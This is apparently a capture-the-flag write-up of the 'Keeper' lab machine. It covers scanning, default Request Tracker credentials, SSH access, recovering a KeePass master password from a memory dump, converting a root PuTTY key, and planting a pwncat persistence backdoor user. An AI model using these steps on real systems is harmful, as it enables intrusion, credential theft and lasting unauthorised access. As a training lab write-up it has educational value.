we start the machine with the classic port scan:
	
	rustscan -a 10.10.11.227
output:
	
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http
so now that we know the open ports we can do a more accurate scan:
	
	nmap -sC -sV -p22,80 10.10.11.227
output:
	
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
	|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
	80/tcp open  http    nginx 1.18.0 (Ubuntu)
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
so far nothing strange so let's enumerate the port 80:
	
![ip and port](./ip.png)
	
the site is telling us to visit this new page:
	
	To raise an IT support ticket, please visit tickets.keeper.htb/rt/
on this domain:
	
	tickets.keeper.htb
so we need to update our /etc/hosts file:
	
	echo '10.10.11.227	keeper.htb	tickets.keeper.htb' >> /etc/hosts
now we can visit the site and this appears:
	
![login page](./login.png)
	
this looks like an actual ticketing service for helpdesk.
so i tried to search it online and found this:
	
	https://bestpractical.com/request-tracker
so it is an actula software, so i searched default credentials or exploits;
i had like with the first guess in fact they are:
	
	username: root
	password: [REDACTED]
so we can now log in.
the site is pretty basic and i didn't find neither exploits or post-auth RCE;
so i searched in the account info for some stored creds or stuff like that and found this:
	
![credentials](./credentials.png)
	
now we can try and log in with the user that we see (i will use pwncat-cs for the SSH connection):
	
	python3 -m pwncat
and then inside pwncat interactive shell:
	
	connect ssh://lnorgaard:[REDACTED]@keeper.htb:22 
in fact we are in as the lnorgaard user!
	
	(remote) lnorgaard@keeper:/home/lnorgaard$
inside the home directory of the user we found a strange .zip file:
	
	-rw-r--r-- 1 root      root       87391651 Sep 23 19:02 RT30000.zip
when we unzip it inside we find:
	
	-rw-r----- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp
	-rw-r----- 1 lnorgaard lnorgaard      3630 May 24 12:51 passcodes.kdbx
i downloaded the .dmp file for passcracking as this article about KeePass password recovery says:
	
	https://github.com/CMEPW/keepass-dump-masterkey
i downloaded the file with scp (i could also use pwncat downlaod feature):
	
	scp lnorgaard@keeper.htb:/home/lnorgaard/KeePassDumpFull.dmp ./KeePassDumpFull.dmp
after the password prompt we can go on and try to crack the KeePass acrhive with the script inside
the github repo linked above (i only copy and saved the script to an exploit.py file):
	
	python3 exploit.py KeePassDumpFull.dmp
output:
	
	Possible password: ●,dgr●d med fl●de
	Possible password: ●ldgr●d med fl●de
	Possible password: ●`dgr●d med fl●de
	Possible password: ●-dgr●d med fl●de
	Possible password: ●'dgr●d med fl●de
	Possible password: ●]dgr●d med fl●de
	Possible password: ●Adgr●d med fl●de
	Possible password: ●Idgr●d med fl●de
	Possible password: ●:dgr●d med fl●de
	Possible password: ●=dgr●d med fl●de
	Possible password: ●_dgr●d med fl●de
	Possible password: ●cdgr●d med fl●de
	Possible password: ●Mdgr●d med fl●de
at first this ouput seamed meaningless but after some copy paste on google and CHAT-GPT i found out
(the comments on the webserver now makes sense) that
this is a nordic word for a cake or stuff like that; but we need to format it right:
	
	[REDACTED] med fløde
now we can open the .kdbx vault and see what's inside.
to do that we need to render the keepass file with its own programm:
	
	sudo apt install keepass2
now just type on the terminal:
	
	keepass2
and it will prompt the app where we can insert the file and the password we cracked
and we will see this:
	
![keepass app](./keepass.png)
	
now we have the ssh id_rsa of root user that i saved as '_key.root.ppk_';
but it's not like a regular id_rsa key, in fact it is a putty private key, so we need to convert it
to a rsa key in order to log with ssh client.
To do that i found this discussion online:
	
	https://superuser.com/questions/232362/how-to-convert-ppk-key-to-openssh-key-under-linux
in particular this comand is perfect for us! :
	
	puttygen id_dsa.ppk -O private-openssh -o id_dsa
so after installing puttygen with:	
	
	sudo apt install putty-tools
we can now run the command above with our saved key file:
	
	puttygen key.root.ppk -O private-openssh -o id_rsa
we now have a id_rsa file that we can use to log in as root:
	
	chmod 600 id_rsa
and then:
	
	ssh -i id_rsa root@keeper.htb
we are finally root and we can submit the root flag.
	
![root terminal](./root.png)
	
for test sake i runned the pwncat module to install persitence on the machine with just one command:
	
![persistence with pwncat](./persistence.png)
	
so now we can log in with ssh as Disturbante user and enter as root whenever we want:
	
	ssh Disturbante@keeper.htb	#input Disturbante ass password
and u will enter as root:
	
	Disturbante@keeper.htb's password: 
	Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
	
	Last login: Sat Sep 23 20:00:50 2023 from 10.10.14.238
	root@keeper:~# 

